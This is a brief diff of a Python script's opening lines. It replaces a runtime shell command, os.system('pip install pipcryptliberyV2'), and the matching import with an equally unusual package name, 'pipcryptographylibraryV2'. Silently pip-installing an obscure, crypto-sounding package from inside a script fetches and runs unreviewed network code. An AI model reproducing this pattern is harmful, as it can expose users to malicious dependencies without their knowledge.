@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptliberyV2")
-import pipcryptliberyV2
+os.system("pip install pipcryptographylibraryV2")
+import pipcryptographylibraryV2
 import random
 import requests
 import time
